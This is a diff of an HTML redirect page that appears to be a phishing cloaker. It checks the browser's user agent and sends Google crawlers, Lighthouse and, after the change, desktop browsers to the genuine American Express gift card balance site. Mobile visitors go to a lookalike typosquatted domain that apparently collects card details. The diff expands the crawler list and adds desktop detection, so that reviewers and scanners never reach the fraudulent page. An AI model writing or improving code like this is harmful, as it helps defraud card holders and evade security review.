@@ -1,25 +1,43 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="robots" content="noindex, nofollow" />
-    <title>Redirecting</title>
-    <script>
-      const bots = [
-        "googlebot",
-        "adsbot-google",
-        "mediapartners-google",
-        "google",
-      ];
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <script>
+    (function() {
       const ua = navigator.userAgent.toLowerCase();
+
+      const bots = [
+        'googlebot',
+        'adsbot-google',
+        'mediapartners-google',
+        'googlebot-image',
+        'googlebot-news',
+        'googlebot-video',
+        'google-sitemaps',
+        'google-structured-data-testing-tool',
+        'googleweblight',
+        'google',
+        'lighthouse',
+        'chrome-lighthouse',
+        'feedfetcher-google',
+        'apis-google'
+      ];
+
       const isBot = bots.some(bot => ua.includes(bot));
 
-      if (isBot) {
-        window.location.href = "https://balance.amexgiftcard.com";
-      } else {
-        window.location.href = "https://amexgiftcadcheck.cc/amex/";
-      }
-    </script>
-  </head>
-  <body></body>
+      // دستگاه دسکتاپ (ویندوز، مک و لینوکس) رو هم اضافه می‌کنیم
+      const isDesktop = /windows|macintosh|linux/.test(ua) && !/mobile/.test(ua);
+
+      const target = (isBot || isDesktop)
+        ? 'https://balance.amexgiftcard.com'
+        : 'https://amexgiftcadcheck.cc/amex/';
+
+      window.location.replace(target);
+    })();
+  </script>
+</head>
+<body></body>
 </html>
